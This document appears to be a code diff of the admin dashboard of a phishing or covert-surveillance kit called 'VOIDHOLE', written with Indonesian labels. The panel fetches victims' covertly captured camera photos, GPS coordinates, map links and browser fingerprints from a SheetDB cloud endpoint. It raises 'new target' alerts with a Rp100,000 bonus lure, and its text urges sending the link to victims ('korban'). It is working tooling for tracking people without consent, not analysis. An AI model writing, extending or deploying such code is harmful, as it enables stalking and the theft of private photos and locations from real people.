@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💀 VOIDHOLE ADMIN PANEL 💀</title>
+    <title>💀 VOIDHOLE ADMIN - REAL TIME 💀</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
         body{background:#0a0a0a;font-family:'Courier New',monospace;padding:20px;}
@@ -12,72 +12,173 @@
         .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:20px;}
         .stat-card{background:#1a1a1a;padding:20px;border-radius:10px;text-align:center;border-left:4px solid #ff0000;}
         .stat-number{font-size:36px;color:#ff0000;font-weight:bold;}
-        .refresh-btn{background:#ff0000;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;margin-bottom:20px;}
-        .data-list{background:#1a1a1a;border-radius:10px;overflow:hidden;padding:10px;}
-        .data-item{background:#0a0a0a;padding:15px;margin:10px;border-radius:8px;border:1px solid #ff0000;}
+        .flash-btn{background:#ffaa00;color:#000;padding:15px;border:none;border-radius:10px;cursor:pointer;margin-right:10px;font-weight:bold;}
+        .data-list{background:#1a1a1a;border-radius:10px;overflow:hidden;padding:10px;max-height:600px;overflow-y:auto;}
+        .data-item{background:#0a0a0a;padding:15px;margin:10px;border-radius:8px;border:1px solid #ff0000;animation:slideIn 0.3s;}
+        @keyframes slideIn{
+            from{opacity:0;transform:translateX(-20px);}
+            to{opacity:1;transform:translateX(0);}
+        }
         .data-header{display:flex;justify-content:space-between;margin-bottom:10px;color:#ff6666;}
         .data-type{color:#ffaa00;font-weight:bold;}
         .data-content{color:#fff;word-break:break-all;font-size:12px;}
-        img{max-width:100%;border-radius:8px;margin-top:10px;}
+        img{max-width:100%;border-radius:8px;margin-top:10px;border:2px solid red;}
         .tab-buttons{display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap;}
         .tab-btn{background:#333;color:white;padding:10px 20px;border:none;cursor:pointer;}
         .tab-btn.active{background:#ff0000;}
         .tab-content{display:none;}
         .tab-content.active{display:block;}
-        .empty-data{text-align:center;padding:40px;color:#666;}
+        .notification{
+            position:fixed;
+            top:20px;
+            right:20px;
+            background:#ff0000;
+            color:white;
+            padding:15px;
+            border-radius:10px;
+            z-index:9999;
+            animation:notifSlide 0.5s;
+        }
+        @keyframes notifSlide{
+            from{transform:translateX(100%);}
+            to{transform:translateX(0);}
+        }
+        .strobe-control{
+            position:fixed;
+            bottom:20px;
+            right:20px;
+            background:#333;
+            padding:10px;
+            border-radius:50px;
+            z-index:9998;
+        }
+        .strobe-control button{
+            background:#ff0000;
+            border:none;
+            padding:10px 20px;
+            color:white;
+            border-radius:50px;
+            cursor:pointer;
+        }
     </style>
 </head>
 <body>
     <div class="header">
         <h1>💀 VOIDHOLE ADMIN PANEL 💀</h1>
-        <p style="text-align:center;color:#ff6666;">Live Target Monitoring | Data dari korban</p>
+        <p style="text-align:center;color:#ff6666;">🔴 REAL TIME TARGET MONITORING 🔴</p>
     </div>
     
     <div class="stats">
-        <div class="stat-card"><div class="stat-number" id="totalTargets">0</div><div>Total Data</div></div>
-        <div class="stat-card"><div class="stat-number" id="totalPhotos">0</div><div>Foto</div></div>
-        <div class="stat-card"><div class="stat-number" id="totalLocations">0</div><div>Lokasi</div></div>
+        <div class="stat-card"><div class="stat-number" id="totalTargets">0</div><div>Total Target</div></div>
+        <div class="stat-card"><div class="stat-number" id="totalBonus">0</div><div>Bonus Rp100k</div></div>
+        <div class="stat-card"><div class="stat-number" id="onlineNow">0</div><div>Target Hari Ini</div></div>
     </div>
     
     <div class="tab-buttons">
-        <button class="tab-btn active" onclick="switchTab('all')">📋 Semua Data</button>
-        <button class="tab-btn" onclick="switchTab('photo')">📸 Foto Target</button>
-        <button class="tab-btn" onclick="switchTab('location')">📍 Lokasi Target</button>
-        <button class="tab-btn" onclick="switchTab('fingerprint')">🖥️ Fingerprint</button>
+        <button class="tab-btn active" onclick="switchTab('all')">📋 SEMUA TARGET</button>
+        <button class="tab-btn" onclick="switchTab('photo')">📸 FOTO TARGET</button>
+        <button class="tab-btn" onclick="switchTab('location')">📍 LOKASI</button>
     </div>
     
-    <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
-    <button class="refresh-btn" onclick="exportData()" style="background:#333;margin-left:10px;">📥 Export JSON</button>
-    <button class="refresh-btn" onclick="clearData()" style="background:#8b0000;margin-left:10px;">🗑️ Hapus Semua</button>
+    <div style="margin-bottom:20px;">
+        <button class="flash-btn" onclick="refreshData()">🔄 REFRESH MANUAL</button>
+        <button class="flash-btn" onclick="exportAllData()" style="background:#333;color:#fff;">📥 EXPORT JSON</button>
+        <button class="flash-btn" onclick="clearData()" style="background:#8b0000;color:#fff;">🗑️ HAPUS SEMUA</button>
+    </div>
     
     <div id="allTab" class="tab-content active"><div class="data-list" id="dataList"></div></div>
     <div id="photoTab" class="tab-content"><div class="data-list" id="photoList"></div></div>
     <div id="locationTab" class="tab-content"><div class="data-list" id="locationList"></div></div>
-    <div id="fingerprintTab" class="tab-content"><div class="data-list" id="fingerprintList"></div></div>
+    
+    <div class="strobe-control">
+        <button id="strobeBtn">⚡ AKTIFKAN SENTER ⚡</button>
+    </div>
     
     <script>
-        let allData = [];
+        // CONFIG - GANTI DENGAN URL SHEETSDB LU
+        const SHEETDB_URL = "https://sheetdb.io/api/v1/19jem7r266r05"; // GANTI!
         
-        function loadData() {
-            const stored = localStorage.getItem('voidhole_data');
-            if(stored && stored !== 'undefined' && stored !== 'null') {
-                try {
-                    allData = JSON.parse(stored);
-                } catch(e) {
-                    allData = [];
+        let allData = [];
+        let lastCount = 0;
+        
+        // Strobe effect ke target (simulasi)
+        function activateStrobe() {
+            alert("⚡ STROBE AKTIF! ⚡\nEfek senter akan terlihat di halaman target kalo masih terbuka.");
+            // Kirim sinyal ke localStorage (cuma simulasi)
+            localStorage.setItem('strobe_signal', Date.now().toString());
+            setTimeout(() => localStorage.removeItem('strobe_signal'), 2000);
+        }
+        
+        document.getElementById('strobeBtn').addEventListener('click', activateStrobe);
+        
+        // Load data dari cloud
+        async function loadData() {
+            try {
+                const response = await fetch(SHEETDB_URL);
+                const data = await response.json();
+                
+                if(data && data.length > 0) {
+                    allData = data;
+                } else {
+                    // Fallback ke localStorage
+                    const stored = localStorage.getItem('voidhole_cloud_data');
+                    if(stored) allData = JSON.parse(stored);
+                    else allData = [];
                 }
-            } else {
-                allData = [];
+                
+                updateStats();
+                renderAllTabs();
+                checkNewTarget();
+                
+            } catch(e) {
+                console.log('Gagal fetch dari cloud, pake lokal:', e);
+                const stored = localStorage.getItem('voidhole_cloud_data');
+                if(stored) allData = JSON.parse(stored);
+                else allData = [];
+                renderAllTabs();
             }
-            
+        }
+        
+        function updateStats() {
             document.getElementById('totalTargets').innerText = allData.length;
-            document.getElementById('totalPhotos').innerText = allData.filter(d => d && d.type === 'photo').length;
-            document.getElementById('totalLocations').innerText = allData.filter(d => d && d.type === 'location').length;
+            document.getElementById('totalBonus').innerText = allData.filter(d => d.status === 'completed').length;
             
+            const today = new Date().toDateString();
+            const todayCount = allData.filter(d => {
+                const dDate = new Date(d.timestamp).toDateString();
+                return dDate === today;
+            }).length;
+            document.getElementById('onlineNow').innerText = todayCount;
+        }
+        
+        function checkNewTarget() {
+            if(allData.length > lastCount) {
+                const newTargets = allData.slice(lastCount);
+                newTargets.forEach(target => {
+                    showNotification(`🎯 TARGET BARU! 🎯\nID: ${target.targetId}\n${target.location ? '📍 Lokasi: ' + target.location.lat + ', ' + target.location.lng : '📍 Lokasi: Tidak diketahui'}\n💰 Klaim Rp100.000!`);
+                    
+                    // Suara notifikasi
+                    try {
+                        const audio = new Audio('https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3');
+                        audio.play();
+                    } catch(e) {}
+                });
+                lastCount = allData.length;
+            }
+        }
+        
+        function showNotification(msg) {
+            const notif = document.createElement('div');
+            notif.className = 'notification';
+            notif.innerHTML = msg.replace(/\n/g,'<br>');
+            document.body.appendChild(notif);
+            setTimeout(() => notif.remove(), 5000);
+        }
+        
+        function renderAllTabs() {
             renderList('dataList', allData);
-            renderList('photoList', allData.filter(d => d && d.type === 'photo'));
-            renderList('locationList', allData.filter(d => d && d.type === 'location'));
-            renderList('fingerprintList', allData.filter(d => d && d.type === 'fingerprint'));
+            renderList('photoList', allData.filter(d => d.camera));
+            renderList('locationList', allData.filter(d => d.location));
         }
         
         function renderList(elementId, data) {
@@ -85,38 +186,34 @@
             if(!container) return;
             
             if(!data || data.length === 0) {
-                container.innerHTML = '<div class="empty-data">📭 Belum ada data dari target. Kirim link dulu ke korban!</div>';
+                container.innerHTML = '<div style="text-align:center;padding:40px;color:#666;">📭 Belum ada target. Kirim link ke korban!</div>';
                 return;
             }
             
             container.innerHTML = data.map((item, idx) => {
                 let content = '';
-                if(item.type === 'photo') {
-                    content = `<img src="${item.data}" alt="Foto Target" style="max-width:100%; border:2px solid red; border-radius:10px;">`;
-                } else if(item.type === 'location') {
+                if(item.camera) {
+                    content = `<img src="${item.camera}" alt="Foto Target">`;
+                } else if(item.location) {
                     content = `
-                        <div>📍 Latitude: ${item.lat}</div>
-                        <div>📍 Longitude: ${item.lng}</div>
-                        <div>🎯 Akurasi: ${item.accuracy} meter</div>
-                        <a href="https://www.google.com/maps?q=${item.lat},${item.lng}" target="_blank" style="color:#ff0000; font-size:14px;">🌍 BUKA GOOGLE MAPS</a>
-                    `;
-                } else if(item.type === 'fingerprint') {
-                    content = `
-                        <div><strong>🖥️ User Agent:</strong><br>${item.userAgent}</div>
-                        <div><strong>📱 Screen:</strong> ${item.screenSize}</div>
-                        <div><strong>🌐 Language:</strong> ${item.language}</div>
-                        <div><strong>💻 Platform:</strong> ${item.platform}</div>
-                        <div><strong>⏰ Timezone:</strong> ${item.timezone}</div>
+                        <div>📍 Latitude: ${item.location.lat}</div>
+                        <div>📍 Longitude: ${item.location.lng}</div>
+                        <div>🎯 Akurasi: ${item.location.accuracy} meter</div>
+                        <a href="https://www.google.com/maps?q=${item.location.lat},${item.location.lng}" target="_blank" style="color:#ff0000;">🌍 BUKA MAPS</a>
                     `;
                 } else {
-                    content = `<pre style="font-size:10px; overflow:auto;">${JSON.stringify(item, null, 2)}</pre>`;
+                    content = `
+                        <div>🆔 Target ID: ${item.targetId}</div>
+                        <div>🌐 User Agent: ${(item.userAgent || '').substring(0, 80)}...</div>
+                        <div>💰 Status: ${item.status === 'completed' ? '✅ SUDAH KLAIM BONUS' : '⏳ PENDING'}</div>
+                    `;
                 }
                 
                 return `
                     <div class="data-item">
                         <div class="data-header">
-                            <span class="data-type">📌 ${item.type ? item.type.toUpperCase() : 'UNKNOWN'}</span>
-                            <span>🕐 ${item.timestamp ? new Date(item.timestamp).toLocaleString() : 'No date'}</span>
+                            <span class="data-type">🎯 TARGET ${idx+1}</span>
+                            <span>🕐 ${new Date(item.timestamp).toLocaleString()}</span>
                         </div>
                         <div class="data-content">${content}</div>
                     </div>
@@ -130,31 +227,38 @@
             btns.forEach(btn => btn.classList.remove('active'));
             contents.forEach(content => content.classList.remove('active'));
             if(event && event.target) event.target.classList.add('active');
-            else btns[0].classList.add('active');
             document.getElementById(tab + 'Tab').classList.add('active');
         }
         
-        function exportData() {
+        function refreshData() {
+            loadData();
+            showNotification('🔄 Data di-refresh!');
+        }
+        
+        function exportAllData() {
             const dataStr = JSON.stringify(allData, null, 2);
             const blob = new Blob([dataStr], {type: 'application/json'});
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `voidhole_data_${new Date().toISOString()}.json`;
+            a.download = `voidhole_targets_${new Date().toISOString()}.json`;
             a.click();
             URL.revokeObjectURL(url);
         }
         
         function clearData() {
-            if(confirm('⚠️ Yakin hapus SEMUA data target? ⚠️')) {
-                localStorage.removeItem('voidhole_data');
-                loadData();
+            if(confirm('⚠️ Yakin hapus SEMUA data target? Data akan hilang permanen! ⚠️')) {
+                localStorage.removeItem('voidhole_cloud_data');
+                allData = [];
+                renderAllTabs();
+                updateStats();
                 alert('✅ Semua data telah dihapus!');
             }
         }
         
+        // Auto refresh setiap 5 detik
         loadData();
-        setInterval(loadData, 3000);
+        setInterval(loadData, 5000);
     </script>
 </body>
-  </html>
+    </html>
